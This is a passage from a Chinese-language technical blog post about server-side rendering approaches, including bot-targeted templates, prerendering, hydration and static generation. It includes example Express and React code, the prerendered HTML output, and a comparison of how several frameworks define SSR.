punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/games/:id'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> userAgent <span class="token operator">=</span> req<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'user-agent'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 檢查 User Agent 是否為 Googlebot</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>userAgent<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'Googlebot'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 如果是 Googlebot，輸出 SEO 相關的 HTML 與 meta tags</span>    <span class="token keyword">const</span> game <span class="token operator">=</span> <span class="token constant">API</span><span class="token punctuation">.</span><span class="token function">getGame</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">      &lt;html>        &lt;head>          &lt;title></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>game<span class="token punctuation">.</span>title<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/title>          &lt;meta name="description" content="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>game<span class="token punctuation">.</span>desc<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">">        &lt;/head>          &lt;body>            &lt;h1></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>game<span class="token punctuation">.</span>title<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/h1>            &lt;p></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>game<span class="token punctuation">.</span>desc<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/p>          &lt;/body>        &lt;/html>    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 如果不是 Googlebot，回傳 index.html</span>    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">'/public/index.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Server is running on port 3000'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>對於一般使用者來說，效能跟使用者體驗的問題還是沒有解決，這種解法只解了 SEO 跟 link preview，確保這些 bot 抓到的畫面是 HTML。</p><p>我自己有在工作上實作過這種方式，優點就是簡單快速，而且跟 SPA 互不干擾，缺點大概就是 Google bot 看到的頁面會跟使用者看到的不一樣，有可能影響到 SEO 分數，畢竟針對 Google bot 輸出特殊頁面是 anti-pattern，叫做 cloaking。</p><p>雖然我們的出發點是好的，但仍然是不被官方建議的行為，可以參考 Google 官方的影片：<a href="https://www.youtube.com/watch?v=wBO-1ETf_dY&ab_channel=GoogleSearchCentral">Can we serve Googlebot a different page with no ads?</a>，裡面就提到了最好是 exact same page。</p><p>但比起讓 Google bot 什麼都看不到，這個解法應該還是更好一些。</p><h3><span id="第二種同樣是針對搜尋引擎但是做-pre-render">第二種：同樣是針對搜尋引擎，但是做 pre-render</span></h3><p>這個解法最知名的框架是 <a href="https://github.com/prerender/prerender">Prerender</a>，簡單來講就是先在 server 端用 puppeteer 之類的 headless browser 去開啟你的頁面並且執行 JavaScript，然後把結果保存成 HTML。</p><p>當搜尋引擎來要資料的時候，就輸出這個 HTML，因此使用者跟 bot 看到的畫面是一樣的。</p><p>我有在 local 試了一下，用 create-react-app 簡單寫了一個頁面：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> logo <span class="token keyword">from</span> <span class="token string">'./logo.svg'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">'./App.css'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> useState<span class="token punctuation">,</span> useEffect <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'render'</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> <span class="token punctuation">[</span>data<span class="token punctuation">,</span> setData<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'title'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent <span class="token operator">=</span> <span class="token string">'I am new title'</span>     <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://cat-fact.herokuapp.com/facts/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">a</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token function">setData</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token operator">&lt;</span>div className<span class="token operator">=</span><span class="token string">"App"</span><span class="token operator">></span>      <span class="token operator">&lt;</span>header className<span class="token operator">=</span><span class="token string">"App-header"</span><span class="token operator">></span>        <span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token punctuation">&#123;</span>logo<span class="token punctuation">&#125;</span> className<span class="token operator">=</span><span class="token string">"App-logo"</span> alt<span class="token operator">=</span><span class="token string">"logo"</span> <span class="token operator">/</span><span class="token operator">></span>        <span class="token punctuation">&#123;</span>data <span class="token operator">&amp;&amp;</span> data<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=></span> <span class="token punctuation">(</span>          <span class="token operator">&lt;</span>div<span class="token operator">></span><span class="token punctuation">&#123;</span>item<span class="token punctuation">.</span>text<span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>        <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>        <span class="token operator">&lt;</span>a          className<span class="token operator">=</span><span class="token string">"App-link"</span>          href<span class="token operator">=</span><span class="token string">"https://reactjs.org"</span>          target<span class="token operator">=</span><span class="token string">"_blank"</span>          rel<span class="token operator">=</span><span class="token string">"noopener noreferrer"</span>        <span class="token operator">></span>          Learn React          Can you see me now<span class="token operator">?</span>        <span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span>        <span class="token operator">&lt;</span>button onClick<span class="token operator">=</span><span class="token punctuation">&#123;</span>test<span class="token punctuation">&#125;</span><span class="token operator">></span>hello<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span>      <span class="token operator">&lt;</span><span class="token operator">/</span>header<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要想測的有幾點：</p><ol><li>頁面是不是依然可以互動</li><li>動態修改的 title 是否會反映在結果</li><li>是不是會輸出拿到 API response 後的結果</li></ol><p>經過 prerender 以後，輸出的 HTML 為：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icon<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:5555/favicon.ico<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width,initial-scale=1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>theme-color<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#000000<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>description<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Web site created using create-react-app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>apple-touch-icon<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:5555/logo192.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>manifest<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:5555/manifest.json<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>I am new title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">defer</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>defer<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:5555/static/js/main.21981749.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:5555/static/css/main.f855e6bc.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>noscript</span><span class="token punctuation">></span></span>You need to enable JavaScript to run this app.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>noscript</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App-header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/media/logo.6ce24c58023cc2f8fd88fe9d219db6c6.svg<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App-logo<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logo<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>When asked if her husband had any hobbies, Mary Todd Lincoln is said to have replied "cats."<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>Cats make about 100 different sounds. Dogs make only about 10.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>Owning a cat can reduce the risk of stroke and heart attack by a third.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>Most cats are lactose intolerant, and milk can cause painful stomach cramps and diarrhea. It's best to forego the milk and just give your cat the standard: clean, cool drinking water.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>It was illegal to slay cats in ancient Egypt, in large part because they provided the great service of controlling the rat population.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>App-link<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://reactjs.org<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>noopener noreferrer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Learn React Can you see me now?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span><span class="token punctuation">></span></span>hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>title 有變了，內容也是 <code>useEffect()</code> 的 <code>fetch</code> 執行完並且 render 完的結果，按了按鈕以後也可以觸發事件，看起來沒什麼問題。</p><p>如果更仔細看一下，prerender 渲染出來的頁面執行流程跟正常 React app 差不多，唯一的差別在於原本的 HTML 就已經有東西了，但整個 React 還是會執行一次，並且將整個頁面重新渲染。</p><p>因此會出現底下狀況：</p><ol><li>拿到 server response，是完整並且有資料的頁面</li><li>React 啟動，進行初次渲染，此時 data 變成初始化狀態，頁面變成沒資料的狀態</li><li>React 將結果 mount 到 DOM，觸發 useEffect，再打一次 API 拿資料</li><li>狀態更新，渲染出有資料的頁面</li></ol><p>這個解法依然是只針對搜尋引擎，跟第一種的差別在於使用者跟搜尋引擎看到的頁面會更相近，但其實還是不太一樣，畢竟一般使用者看到的還是什麼都沒有的頁面。</p><p>那可以把 pre-render 的頁面也拿給一般使用者看嗎？</p><p>是可以，但如果有 API 的話會變得有點奇怪，如上所述，初始狀態 state 是沒有資料的，但是 HTML 有，因此使用者看到的頁面就會是：有資料（因為 pre-render HTML） &#x3D;&gt; 沒資料（state 初始化） &#x3D;&gt; 有資料（在 client 打 API），在體驗上會不太好，所以通常也不會這樣做。</p><p>這個解法的優點也是方便，不需要改到原本的 SPA，只需要在 server 那邊加一個 middleware 即可，而缺點的話則是實作起來比第一種複雜，而且有滿多細節要注意的，可以參考：<a href="https://techblog.funliday.com/2020/05/25/Funliday-%E9%87%8D%E7%A3%85%E6%8E%A8%E5%87%BA%E6%96%B0%E7%9A%84-prerender-%E5%A5%97%E4%BB%B6-pppr/">Funliday 重磅推出新的 prerender 套件 pppr</a> 以及 <a href="https://techblog.funliday.com/2020/10/14/%E5%9C%A8-ModernWeb-2020-%E5%88%86%E4%BA%AB%E7%9A%84%E3%80%8Cpppr-%E8%A7%A3%E6%B1%BA-JavaScript-%E7%84%A1%E6%B3%95%E8%A2%AB%E6%90%9C%E5%B0%8B%E5%BC%95%E6%93%8E%E6%AD%A3%E7%A2%BA%E7%B4%A2%E5%BC%95%E7%9A%84%E5%95%8F%E9%A1%8C%E3%80%8D/">在 ModernWeb 2020 分享的「pppr - 解決 JavaScript 無法被搜尋引擎正確索引的問題」</a>。</p><h3><span id="第三種在-server-render-client-app">第三種：在 server render client app</span></h3><p>這一種就是前面一直提到的：「在 server 產生第一個畫面的 HTML，而後續的操作都交給 client」，相較於前兩者，這是更理想的 SSR，也是俗稱的 Isomorphic&#x2F;Universal。</p><p>因為這種的做法不只解決了 SEO 的問題，也解決了使用者體驗的問題。當使用者造訪網站時，就可以立刻看到渲染完的結果，但此時畫面因為 JavaScript 沒有執行完，可能沒有辦法操作，需要等 JavaScript 執行完畢並且把 event handler 掛上時，才能真的跟頁面互動。</p><p>另外，由於初始畫面已經在 server 渲染好了，所以在 client 端通常不需要再修改一次 DOM，只需要把 event handler 掛上去，這個流程稱為 hydration，中文通常翻作「水合」。</p><p>我覺得這個詞用得相當有畫面感，就把它想成是 SSR 輸出的頁面是被「脫水」過的，非常扁平乾燥，就只有畫面而已，沒辦法跟它互動。到了 client 以後，就需要把這個乾燥的畫面注入水，加上 event handler，讓整個頁面「活起來」，才能重現生機，變成可互動的頁面。</p><p>然而，這種解法的缺點就是實作起來更複雜一點，需要考慮到的問題是 API，例如說如果把 API call 放在 <code>useEffect</code> 裡面，那在 server render 時就不可能執行到，最後渲染出來的頁面就是沒有任何資料的狀態。</p><p>因此，可能要幫每個頁面都加上一個 function 去拿取資料，拿完之後放到 props 去，在 server side render 時才能正確輸出有資料的頁面。</p><p>也因為這個比較複雜，所以通常都交給框架來做了，像是 Next.js 就是採用我前面講的做法（Pages Router），會在頁面加上一個 <code>getServerSideProps</code> 的 function。</p><p>順帶一提，Next.js 的第一版是 2016 年 10 月 25 釋出的。</p><h3><span id="第四種在-build-time-就做-render">第四種：在 build time 就做 render</span></h3><p>這算是針對產品情境特化的 SSR，剛剛講的第三種，是在每一個 request 都會做一次 render，產生出初始畫面。但如果你的頁面對於每一個 user 來說都長一樣（例如說官方網站的公司介紹），那其實根本不用在 run time 做這件事，在 build time 就好了。</p><p>於是，有一種做法是在 build time 的時候就會把頁面 render 好，速度會快上許多。</p><p>這種方法在 Next.js 裡面被稱之為 Static Site Generation，簡稱為 SSG。</p><h2><span id="該怎麼命名各種不同的-ssr">該怎麼命名各種不同的 SSR？</span></h2><p>整理一下剛剛講的四種：</p><ol><li>針對搜尋引擎以及 bot 渲染另一個模板</li><li>同樣是針對搜尋引擎，但是做 pre-render</li><li>在 server render client app</li><li>在 build time 就做 render</li></ol><p>不同的文件對於這幾種的稱呼都不同，接著來看幾份文件。</p><h3><span id="webdev">web.dev</span></h3><p>第一份是 web.dev 的：<a href="https://web.dev/articles/rendering-on-the-web">Rendering on the Web</a>，在文末有一個光譜：</p><p><img src="/img/server-side-rendering-ssr-and-isomorphic/p6.png" alt="SSR 光譜"></p><p>第一種沒特別提到，第二種比較像是「CSR with Prerendering」，但又好像不太像，第三種是：「SSR with (Re)hydration」，第四種是：「Static SSR」。</p><p>這篇對於 SSR 的定義為：</p><blockquote><p>Server-side rendering (SSR): rendering a client-side or universal app to HTML on the server.</p></blockquote><p>所以像是第一種並沒有在 server 端去 render client-side app，應該也不會被算作 SSR。</p><h3><span id="nextjs">Next.js</span></h3><p>第二份是 Next.js 官方的文件：<a href="https://nextjs.org/docs/pages/building-your-application/rendering">https://nextjs.org/docs/pages/building-your-application/rendering</a></p><p>有提到的就是第三種叫做 SSR，第四種叫做 SSG。而這邊的定義其實又更不同了一點，它把「在 server 端產生 SPA 的 HTML」這件事情叫做 pre-render：</p><blockquote><p>By default, Next.js pre-renders every page. This means that Next.js generates HTML for each page in advance, instead of having it all done by client-side JavaScript. Pre-rendering can result in better performance and SEO.</p></blockquote><p>而 SSR 專門指的是「每次 request 都產生 HTML」，藉此跟 SSG 做出區別。</p><h3><span id="nuxtjs">Nuxt.js</span></h3><p>第三份來看 Nuxt.js：<a href="https://nuxt.com/docs/guide/concepts/rendering">https://nuxt.com/docs/guide/concepts/rendering</a></p><p>文件裡面把第三種稱之為：「Universal Rendering」，其實我覺得取得還滿不錯的：</p><blockquote><p>To not lose the benefits of the client-side rendering method, such as dynamic interfaces and pages transitions, the Client (browser) loads the JavaScript code that runs on the Server in the background once the HTML document has been downloaded. The browser interprets it again (hence Universal rendering) and Vue.js takes control of the document and enables interactivity.</p></blockquote><p>至於對 SSR 的定義，似乎沒有寫得太明確，不過從底下這句看起來：</p><blockquote><p>This step is similar to traditional server-side rendering performed by PHP or Ruby applications.</p></blockquote><p>應該是「只要在 server render 畫面」都可以叫做 SSR。</p><h3><span id="angular">Angular</span></h3><p>最後來看 Angular 的：<a href="https://angular.io/guide/ssr">https://angular.io/guide/ssr</a></p><p>它對 SSR 的定義為：</p><blockquote><p>Server-side rendering (SSR) is a process that involves rendering pages on the server, resulting in initial HTML content which contains initial page state.</p></blockquote><p>這定義看起來應該跟剛那種差不多，只要是「rendering pages on the server」都可以稱之為 SSR。</p><h2><span id="ssr-的總結">SSR 的總結</span></h2><p>來講一下我寫到這邊以後，對於 SSR 的一些想法。</p><p>老實說我一開始好像有點把問題搞得太複雜了，SSR 就單純是指「在 server render 畫面」這件事情而已，所以確實只要符合這個前提就可以叫做 SSR。</p><p>其實這篇原本想寫的只有剛剛講的那幾種不同的 SSR 解決方案，但還沒寫之前就突然好奇起了 SSR 的定義，才有了開頭那些探索歷史的段落。</p><p>更重要的應該是對於 SSR 這個議題，是否能回答出要解決的問題是什麼，該怎麼解決，以及每種解法的優缺點等等，並不是每個網頁都需要 Next.js 才能做 SSR，要根據情境去選擇合適的技術。</p><p>接著，我們來談談現在進行式以及未來。</p><h2><span id="榨取更多的效能打造更快的網頁">榨取更多的效能，打造更快的網頁</span></h2><p>原本我們提到的第三種解法看起來已經很完美了對吧？既可以在 server 端渲染畫面，解決 SEO 以及 first paint 的效能問題，又可以在 client 端做 hydration，讓後續操作都有 SPA 的體驗。</p><p>但其實還有能夠持續改善的地方。</p><p>前面有稍微提到 hydration 的一個小問題，那就是在 hydration 完成以前，雖然看到畫面了，但是這個網頁是沒辦法互動的。例如說你在 input 打字，可能不會有反應，因為那時候 event handler 還沒掛上去，或是 component 還沒 render 完。</p><p>那這該怎麼辦呢？有另外一個名詞出現了，叫做：<a href="https://www.patterns.dev/react/progressive-hydration">Progressive Hydration</a>，比起一次 hydration 整個頁面，不如一個一個區塊來做，還可以分優先順序，先把比較重要的區塊做完，使用者就可以馬上互動，再來做比較沒這麼重要的區塊。</p><p>除此之外，你會發現一個網頁的某幾個區塊，可能根本就不需要做 hydration，因為是不會變的，像是 footer 好了，根本沒有狀態，從頭到尾都長一樣。此時就可以運用另一種技巧叫做 <a href="https://www.patterns.dev/react/react-selective-hydration">Selective Hydration</a>，提前 render 不需要 hydration 的區塊。</p><p>2019 年時，Etsy 的前端架構師 Katie Sylor-Miller 提出了 <a href="https://jasonformat.com/islands-architecture/">Islands Architecture</a>，將一個網頁看作是由不同的小島組成：</p><p><img src="/img/server-side-rendering-ssr-and-isomorphic/p7.png" alt="Islands Architecture"></p><p>上面這張圖就很能體現剛剛講的 selective hydration。當我們採用這樣的架構並且搭配 selective hydration 以及其他技巧之後，就能夠更快速地渲染，並且得到更好的效能。</p><p>例如說 <a href="https://docs.astro.build/en/concepts/islands/">Astro</a> 就是使用了這樣的架構，整個頁面都是 static 的，只有需要互動的地方會獨立成為一個小島：</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">MyReactComponent</span></span> <span class="token attr-name"><span class="token namespace">client:</span>load</span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>React 目前也往這個方向在發展，server component 在這點上就滿類似的，藉由把頁面區分成 server 跟 client 